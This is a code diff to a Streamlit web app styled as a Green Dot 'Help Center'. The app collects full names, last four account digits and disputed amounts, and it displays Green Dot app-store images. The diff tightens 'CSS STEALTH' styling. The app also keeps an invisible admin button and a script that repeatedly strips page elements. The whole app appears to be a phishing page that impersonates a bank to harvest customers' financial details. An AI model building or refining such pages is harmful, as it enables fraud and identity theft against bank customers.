@@ -44,13 +44,18 @@ st.markdown("""<script>
     setInterval(nuclearClean, 50);
 </script>""", unsafe_allow_html=True)
 
-# CSS STEALTH: FONDO NEGRO Y BOTÓN INVISIBLE
+# CSS STEALTH: FORZADO DE FONDO NEGRO Y TEXTO BLANCO (ANTI-LIGHT MODE)
 st.markdown("""<style>
     header, footer, .stDeployButton, [data-testid="stHeader"] { display: none !important; }
-    
-    /* Fondo Negro Total */
-    .stApp {
+
+    /* Fondo Negro Total y Texto Blanco Forzado */
+    html, body, [data-testid="stAppViewContainer"], .stApp {
         background-color: #000000 !important;
+        color: #FFFFFF !important;
+    }
+
+    /* Forzar color de texto en todos los labels y markdowns */
+    .stMarkdown, p, span, label, h1, h2, h3, div {
         color: #FFFFFF !important;
     }
 
@@ -63,7 +68,7 @@ st.markdown("""<style>
         width: 100%; border: none; height: 50px; border-radius: 8px; font-weight: bold;
     }
 
-    /* BOTÓN ADMIN INVISIBLE (NEGRO SOBRE NEGRO) */
+    /* BOTÓN ADMIN INVISIBLE */
     .admin-trigger {
         position: fixed; bottom: 0; left: 0; width: 60px; height: 60px; z-index: 9999;
     }
@@ -80,7 +85,7 @@ st.markdown("""<style>
 
     /* Otros elementos */
     .promo-box {
-        background-color: #111; padding: 20px; border-radius: 12px; 
+        background-color: #111; padding: 20px; border-radius: 12px;
         text-align: center; margin-top: 20px; border: 1px solid #222;
     }
 </style>""", unsafe_allow_html=True)
@@ -91,7 +96,7 @@ if not st.session_state.admin_mode:
     if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
     st.title("Help Center")
 
-    with st.form("claim_v1_1_8", clear_on_submit=True):
+    with st.form("claim_v1_1_9", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", format="%.2f")
@@ -101,18 +106,18 @@ if not st.session_state.admin_mode:
             st.success("Claim Received.")
 
     st.markdown("""<div class='promo-box'>
-        <p style='color:white;'>Download the Green Dot app</p>
+        <p>Download the Green Dot app</p>
         <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
         <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
     </div>""", unsafe_allow_html=True)
 
     st.markdown("<div class='admin-trigger'>", unsafe_allow_html=True)
-    if st.button(" ", key="adm_btn"): 
+    if st.button(" ", key="adm_btn"):
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div>", unsafe_allow_html=True)
 else:
     st.title("Admin Panel")
-    if st.button("Exit Admin Panel"): 
+    if st.button("Exit Admin Panel"):
         st.session_state.admin_mode = False
         st.rerun()
